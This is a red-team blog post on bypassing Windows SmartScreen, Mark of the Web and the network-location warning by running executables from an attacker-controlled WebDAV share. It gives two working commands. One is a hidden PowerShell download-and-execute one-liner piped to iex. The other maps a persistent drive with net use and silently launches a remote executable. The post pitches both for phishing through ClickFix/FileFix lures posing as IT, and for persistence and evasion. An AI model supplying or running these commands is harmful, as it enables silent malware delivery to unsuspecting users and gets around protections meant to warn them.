---
title: Using WebDav to Outsmart Smartscreen, MOTW, and that OTHER Alert.md
header:
  teaser: "/assets/images/webdav_pic.png"
categories:
  - Initial Access
tags:
  - Initial Access
  - Pentest
  - SmartScreen
  - Pentesting Payload
  - '2026'
  - MOTW
  - Bypasssing Mark of the Web
  - g3tsyst3m
  - Initial Foothold
---

The last time I wrote about **SmartScreen** and **MOTW**, the focus was a bit divided.  I tried my best to blend the use of DLL sideloading with signed binaries packed within a **.VHDX** mounted disk.  In the end, there were aspects to this approach that truly did ultimately bypass SmartScreen and MOTW, but I still wasn't satisfied 😸  Now enter in **WebDav**.  **WebDav** has been around for a very, VERY long time.  It's very convenient as it allows for UNC access via the standard **SMB/CIFS** convention: **\\servername\sharename** but it **DOES NOT** go over port 445!  This is quite handy for bypassing outbound firewall rules that prevent traditional UNC payloads from leaving the network due to outbound 445 restrictions. Now, you may be wondering, how does it bypass port 445 if it's accessible via a UNC path?

Well, the magic here is the WebClient service itself.  When Windows encounters a UNC path and the standard SMB attempt over 445 fails (or is disabled), the WebClient service quietly steps in and re-routes that same \\server\share request over HTTP/HTTPS on port 80 or 443 using the WebDAV protocol.  From the user's perspective (and from the perspective of most tooling), it still looks and feels like an ordinary UNC path!  Explorer renders it, cmd.exe can cd into it, and executables can be launched directly from it (We will get to more of that later in the post 😼).  Under the hood though, it's just HTTP traffic riding out on the same ports your browser uses every second of every day.  No SMB, no port 445, no problem 😼  I'll even show you later on how wireshark never provides statistics for TCP port 445.  Only HTTP/HTTPS when we access our WebDav shared folder.

The Plot Thickens...
-

Now, this is where things get really interesting from a **SmartScreen** and **MOTW** bypass perspective.  Because files executed directly from a WebDAV UNC path aren't technically being "downloaded" through the browser or a mail client, the usual unrelenting MOTW "tattoo" will not get attached to our file(s)! It's as if we're just downloading from a trusted, neighboring device.  So, let me show you how this all plays out in our favor 😸

But first!  A small caveat...So here's the thing.  As with most of my research, I inevitably hit a roadblock somwhere in my initial testing.  Oh, did I hit a massive roadblock.  Even with this advantage I briefly covered above about using UNC paths to elude SmartScreen and MoTW, a direct UNC-based launch still triggers a warning.  Not a "**Hey you!  You downloaded this from the Internet**!" warning. No, more like this kind:

<img width="668" height="496" alt="image" src="https://github.com/user-attachments/assets/461d20e9-4412-4ad9-9927-daa7600c87cc" />

Why UNC Paths Still Prompt (Even With Signed Binaries)
-

When I tested launching even a signed Microsoft binary (`ApplicationFrameHost.exe`) directly from a WebDAV UNC path, I still got the "**This file is in a location outside your local network**" warning. This genuinely surprised me at first.  The file is signed by Microsoft, after all. But the prompt wasn't actually about the signature. It was about the location.

> **Here's what's happening under the hood**: 

Windows has multiple security gates that files must pass through when they execute. The first gate is the zone-based execution check.  The shell's Attachment Execution Service (AES) examines where a file is being launched from and asks "is this location inside or outside the local network?" If Windows determines the file is coming from a non-local location (indicated by the FQDN in the UNC path containing periods), it fires the generic "outside your local network" warning before it ever cares about signatures, reputation, or anything else.

> **Think of it this way**: The prompt is asking "where did this file come from?".  It's not asking "who made this file?" The signature validation happens at a later gate, downstream from this initial location check. So a signed binary, an unsigned binary, and Microsoft's own binaries all hit the same zone-based warning when launched from a network location Windows classifies as untrusted.  The actual security zone determination is quite simple: if the URL contains no period in the server name (like http://sharepoint/davshare), the server is assumed to be on a local intranet site, but if the URL contains periods, the server is assumed to be on the Internet. Since my WebDAV server is **something.somethingelse.com**, Windows relegated it to the Internet zone, and the security gates fired accordingly.

But wait, there's more!  More what you ask?  Ways around this, of course! 😸  But first, let me show you some of the restrictive triggers I found.  When we access a WebDav share via UNC, we can access it a number of ways.

The two ways that flag the **This file is in a location outside your local network** aka that "**OTHER**" alert, are as follows:

If I use the **windows-> run command**:

<img width="454" height="266" alt="image" src="https://github.com/user-attachments/assets/ded67ebe-0391-4314-8e43-ced3cf895485" />

<img width="668" height="496" alt="image" src="https://github.com/user-attachments/assets/6b114005-2ca3-4b2a-a2f6-5dfd88a6ccb0" />

OR, If I use **Windows Explorer**:

<img width="1318" height="365" alt="image" src="https://github.com/user-attachments/assets/343d2136-1017-48a2-8a40-f3db4cd1b14b" />

<img width="668" height="496" alt="image" src="https://github.com/user-attachments/assets/6b114005-2ca3-4b2a-a2f6-5dfd88a6ccb0" />

**HOWEVER!!! I had a breakthrough** 🥷


The Complete Breakthrough: Mapped Drives and execution from within a Terminal Environment Bypasses Everything!
-

If we execute our WebDav share from within a Powershell or CMD terminal....EUREKA!  No more ALERTS!!!!!  See for yourself.  Here's me pointing to my webdav share within a Powershell terminal session:

<img width="1055" height="384" alt="image" src="https://github.com/user-attachments/assets/500556eb-8fd0-472d-a0f9-39315022ffab" />

<img width="403" height="669" alt="image" src="https://github.com/user-attachments/assets/e4f140b6-6c84-4521-94f6-996cf2397369" />

The exe I'm executing from my WebDav share executes calc btw 😆

I feel I need to repeat this for anyone confused on the UNC paths I'm using.  I know it looks like standard SMB/UNC, but with WebDav I assure you it's over 80/443.  In my case, I have a redirect from 80 to 443 and a signed cert using Cloudflare for my WebDav server on my VPS.
Pretty cool right?!  Just to prove it, check out some Wireshark screenshots I took to confirm only ports 80/443 were involved in our little experiment:

<img width="791" height="255" alt="image" src="https://github.com/user-attachments/assets/fd7aacda-9fee-4675-ae50-30ffffad0556" />

<img width="853" height="299" alt="image" src="https://github.com/user-attachments/assets/f2f24ea1-3ef5-4d1c-8c2d-93142ce723c0" />

**Now, 80 and 443 included:**

<img width="1967" height="701" alt="image" src="https://github.com/user-attachments/assets/5095b090-d186-49b1-aa2b-c35cd319572e" />

You can see we're crossing the wire via 80 and 443, confirmed!

> Here's a silly one liner that will open any executable within our WebDavShare to whet your appetite 😸

- First, create a PS1 file that contains the following:

**\\YOURWEBDAV_SERVER\shared-files\yourexecutable.exe**

Next, upload that somewhere and download and execute in memory using powershell:

**powershell -w h -c "iwr 'https://some_server_you_own/webdav_runner.ps1' -UseBasicParsing | iex"**

That will execute within the Powershell terminal environment and bypass SmartScreen, MOTW, and that "OTHER" alert! 😺

Discovery Part 2!
-

> Here's where I discovered the ultimate technique: 

Instead of launching files directly from the UNC path, map the WebDAV share to a drive letter first, then launch from the mapped drive.
  
**cmd.exe /c net use Z: https://some_server_you_own/shared-files /persistent:yes 2>nul && start "" "Z:\YOUR_EXECUTABLE.exe"**

When I tested this, the executable launched with zero prompts, zero warnings, zero MOTW tagging, zero SmartScreen reputation checks.  Nothing. Silent execution.  It was bliss.

The reason? When Windows evaluates file execution, it treats files accessed via a local drive letter fundamentally differently than files accessed via a UNC path.  Even when that drive letter is actually a network mount backed by an attacker-controlled WebDAV server.
Here's the mental model: the shell's attachment execution service has different code paths for these two scenarios:

- UNC path (`\\server\share\file.exe`) → Windows recognizes this as a network location → zone-based security gates fire
- Drive letter (`Z:\file.exe`) → Windows sees this as a local drive → security gates that apply to network locations simply don't trigger

From the shell's perspective, a file on `Z:` is just a file on the Z: drive. The fact that Z: is actually mounted over HTTPS to our attacker controlled WebDAV server is an abstraction detail that doesn't bubble up to the execution security checks. The file appears to be local, so it gets treated as local.

**This effectively bypasses the entire chain of Internet "tattooed" security gates:**

- **Zone-based MOTW attachment** -> skipped, because the file appears "local"
- **That "OTHER" Alert** -> skipped, because mapped drive file execution doesn't trigger the same checks
- **SmartScreen reputation checking** -> skipped, because the file isn't flagged as coming from the internet
- **Zone.Identifier ADS tagging** -> never applied in the first place

Also for the record, there are no loopholes here!  I don't have any secret trusted Zone bypasses in place, I assure you.  See for yourself 😸

<img width="1108" height="935" alt="image" src="https://github.com/user-attachments/assets/410e1661-83d7-44f0-a2c2-83018eedf801" />

Why This Changes Everything
-

This technique is genuinely different from the dotless-hostname or DNS-suffix tricks I was researching earlier. Those approaches require careful network manipulation or pre-existing foothold to change zone mappings. The mapped drive approach is simpler:

It works with any FQDN, requires only one command, and leverages a core Windows feature (the WebClient service and drive mapping) that exists on every modern Windows system.

It's also immediately practical for external phishing or leveraging `ClickFix/FileFix`. A delivery payload can execute a single net use command.  This can be completely silent, can run without admin privileges, and can persist across reboots with /persistent:yes.  We can then launch the actual malicious executable from the now-mapped drive. The entire execution chain looks legitimate: 

"copy this file to your machine, run this utility, and it mounts a network share from your trusted IT department, or whoever." 😸

From an attacker's perspective, this means:

- No signed certificate needed (though one doesn't hurt for defense evasion)
- No special hostname tricks required
- Works with standard HTTPS WebDAV
- Executable launches with zero security prompts
- Suitable for initial access phishing, lateral movement, or persistence

From a defender's perspective, this is precisely the kind of subtle technique that lives in the gap between legacy zone-based security (which assumes network files are inherently riskier) and modern app reputation systems (which can be bypassed if the file never gets tagged as "from the internet" in the first place).

How can we use this from a Tactical, Red Team Perspective?
-

Well, for starters you'll certainly want to explore **ClickFix** and **FileFix** from a social engineering angle.  I'd say that's a given.  Think about it: You just have to coerce the user to run one command and BAM!  File execution complete! (as long as your executable doesn't get caught by EDR.  That's on you and I'm not to blame! 😹)

You could also use this for **persistence purposes** or **evasion**.  The ability to just flat out execute a script or executable across a network share without a security prompt is HUGE!

Also before I forget, you'll likely want to access your **WebDav** share from a domain versus IP address to make it look more official.  I used **Cloudflare** to setup my DNS entries:

<img width="1584" height="668" alt="image" src="https://github.com/user-attachments/assets/18243dad-831d-4c02-951f-43aec55b08b9" />


🎁 ***Bonus Content for all Members! (Sapphire, Emerald, Diamond Tier)*** 🎁
-

**Preview (demo):**

<img width="1844" height="565" alt="image" src="https://github.com/user-attachments/assets/9aa02b8e-86c1-42c1-a6ce-12880947d1ec" />

📓Script for setting up WebDav using Caddy like I did on your server/VPS: [Setup script for WebDav](https://ko-fi.com/s/e3ab64939f) 📓

**Video Preview Teaser (demo):**

<iframe width="560" height="315" src="https://www.youtube.com/embed/1Xbql_zpmdg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

📹 Full Video demonstration for all methods of using WebDav to bypass MOTW/Smartscreen/That "Other" Alert 😸: [Video demonstration](https://ko-fi.com/s/293751dc90) 📹

<div style="text-align: right;">
  
<b>Sponsored By:</b><br>

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png" />

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png" />

</div>




